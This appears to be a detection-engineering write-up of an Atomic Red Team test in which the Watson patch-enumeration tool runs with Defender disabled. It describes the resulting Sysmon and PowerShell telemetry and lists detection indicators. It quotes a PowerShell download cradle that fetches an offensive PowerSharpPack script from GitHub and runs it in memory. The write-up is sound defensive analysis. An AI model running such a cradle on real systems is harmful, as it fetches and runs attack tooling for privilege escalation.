# T1082-21: System Information Discovery — WinPwn - PowerSharpPack - Watson searching for missing windows patches

## Technique Context

T1082 (System Information Discovery) covers the range of methods adversaries use to gather information about the target operating system, hardware, and configuration. Watson is a C# tool designed specifically to identify missing Windows patches by querying installed hotfixes against a database of known privilege escalation vulnerabilities. Attackers use patch enumeration as a direct precursor to local privilege escalation: once Watson identifies a missing patch, the attacker can deploy the corresponding exploit. The PowerSharpPack collection, maintained by S3cur3Th1sSh1t, bundles Watson alongside other offensive tools as in-memory reflective C# assemblies loaded via PowerShell, bypassing the need to drop executables to disk.

In the defended version of this dataset, Windows Defender blocked the technique before Watson could execute, producing a `ScriptContainedMaliciousContent` error. With Defender disabled, the question is whether Watson runs to completion and what telemetry that produces.

## What This Dataset Contains

This dataset captures a 6-second execution window (2026-03-14T23:32:17Z–23:32:23Z) in which the Watson technique was attempted with Defender disabled. The telemetry tells a specific story.

**Process execution chain**: Sysmon EID 1 shows a PowerShell process (PID 5380) created with the full command line:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
```

This process was tagged by sysmon-modular with `technique_id=T1059.001`. The same EID 1 events capture `whoami.exe` (PIDs 3060 and 4876) running as `NT AUTHORITY\SYSTEM` on either side of the main execution.

**Network activity**: Sysmon EID 22 records a successful DNS query for `raw.githubusercontent.com` resolving to four GitHub CDN addresses (`::ffff:185.199.108-111.133`), originating from the PowerShell process at 23:32:18. The download itself succeeded at the network layer.

**Process access**: Three Sysmon EID 10 events show the parent PowerShell process (PID 6216) opening `whoami.exe` and the child PowerShell (PID 5380) with full access rights (`0x1FFFFF`), tagged as potential DLL injection indicators. This is standard .NET process management behavior from the test framework.

**PowerShell script block logging**: 108 EID 4104 events and 1 EID 4103 event were recorded. The samples available include `Import-Module 'C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1'` and the cleanup invocation `Invoke-AtomicTest T1082 -TestNumbers 21 -Cleanup -Confirm:$false`. The bulk of the 108 script blocks represent PowerShell runtime initialization fragments (e.g., `{ Set-StrictMode -Version 1; $_.PSMessageDetails }`).

**DLL loading**: 17 Sysmon EID 7 events capture .NET runtime DLLs loading into the PowerShell process. Notably absent are Windows Defender integration DLLs (`MpOAV.dll`, `MpClient.dll`) that appear prominently in the defended dataset — confirming that Defender was not active during this run.

**Named pipe**: Sysmon EID 17 records creation of `\PSHost.134180047366242174.6216.DefaultAppDomain.powershell`, the standard PowerShell host communication pipe.

**File creation**: Sysmon EID 11 shows PowerShell writing `StartupProfileData-NonInteractive` to `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\` — routine PS profile caching, not attack-related.

**Security events**: Four Security EID 4688 events cover `UsoClient.exe`, `whoami.exe`, and `powershell.exe` process creations. All run as `NT AUTHORITY\SYSTEM` with logon ID `0x3E7`.

**Task Scheduler**: Five events (EIDs 100, 102, 129, 200, 201) indicate Windows Update service activity running concurrently — ambient system noise.

The Application channel contains a single EID 15 event indicating Defender status was set to `SECURITY_PRODUCT_STATE_ON` — this appears to be a Defender re-enable event from the test framework cleanup phase, occurring after the technique completed.

## What This Dataset Does Not Contain

Despite Defender being disabled, Watson itself does not appear to have produced observable output events in this telemetry. There are no EID 4104 script blocks containing Watson's enumeration output, no WMI queries for installed patches (`Win32_QuickFixEngineering`), and no registry reads associated with patch enumeration. This is consistent with Watson being a reflective C# assembly that executes entirely within the PowerShell process memory — its output goes to the PowerShell console rather than to separate process or file creation events. The 108 EID 4104 events almost certainly include the Watson assembly execution, but the available 20 sample events do not show those specific blocks.

There are no Sysmon EID 3 network connection events for the GitHub download — the Sysmon configuration filters outbound connections from PowerShell by default. No file was written to disk containing the downloaded script, consistent with in-memory `iex` execution.

Compared to the defended dataset (47 sysmon, 11 security, 59 powershell), this undefended run produced 27 sysmon, 4 security, and 110 powershell events. The dramatic increase in PowerShell events (110 vs 59) reflects actual execution proceeding further — more script blocks were logged because the payload ran rather than being blocked immediately. The reduction in Sysmon and Security events reflects the absence of Defender-generated process activity that inflated those counts in the defended run.

## Assessment

This dataset documents successful download and in-memory execution of the Watson patch enumeration tool against a domain-joined Windows 11 workstation running as SYSTEM with Defender disabled. The technique executes entirely in memory, leaving no dropped files. The primary forensic record is the PowerShell process creation with the explicit GitHub download URL in the command line, which is fully captured across both EID 4688 (Security) and EID 1 (Sysmon). The DNS query to `raw.githubusercontent.com` provides a second anchor point.

The 108 EID 4104 script block events represent the richest evidence source, containing Watson's assembly code as it was logged by PowerShell's script block recording. However, only a subset of those events appear in the available samples.

## Detection Opportunities Present in This Data

**Sysmon EID 1 (Process Create)**: The PowerShell command line contains `iex(new-object net.webclient).downloadstring(` combined with a URL referencing `S3cur3Th1sSh1t/PowerSharpPack`. This command-line pattern is present in EID 4688 as well and represents one of the most reliable indicators available in this dataset.

**Sysmon EID 22 (DNS Query)**: A DNS resolution for `raw.githubusercontent.com` originating from a PowerShell process running as SYSTEM is anomalous. Legitimate software rarely downloads from GitHub raw content URLs while running as the system account.

**PowerShell EID 4104 (Script Block Logging)**: The full Watson assembly content was split across multiple EID 4104 events during logging. Script block content matching known PowerSharpPack binary patterns would surface in these events.

**Process ancestry**: `whoami.exe` running as `NT AUTHORITY\SYSTEM` with `powershell.exe` as parent, combined with a nearby GitHub download, is a reliable composite indicator. The test framework generates `whoami.exe` as a pre- and post-execution identity check, which happens to create a consistent behavioral signature.
